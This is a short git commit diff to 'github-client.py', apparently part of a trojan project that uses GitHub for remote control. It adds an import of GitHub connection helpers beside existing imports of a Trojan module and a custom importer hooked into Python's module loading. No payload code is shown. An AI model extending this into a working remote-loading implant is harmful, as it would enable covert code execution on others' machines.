dcfc695de8744fe6596522f721c3d8fdbd601b7b
Ethan <ethandebois@gmail.com>
2023-01-09 23:02:23 +0100

    fix stuff

--- github-client.py
+++ github-client.py
@@ -1,6 +1,7 @@
 import sys
 from modules.Trojan import Trojan
 from modules.GitImporter import GitImporter
+from modules.github_connection import github_connect, get_file_contents
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
